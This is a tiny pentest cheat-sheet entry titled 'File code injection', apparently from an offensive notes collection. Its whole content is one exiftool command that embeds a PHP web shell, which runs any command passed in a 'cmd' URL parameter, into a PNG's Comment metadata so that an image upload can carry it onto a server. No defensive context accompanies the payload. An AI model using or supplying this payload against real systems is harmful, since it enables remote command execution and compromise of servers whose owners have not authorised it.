# File code injection

## File code injection

### exiftool image injection

```text
exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ MY_IMAGE.png
```

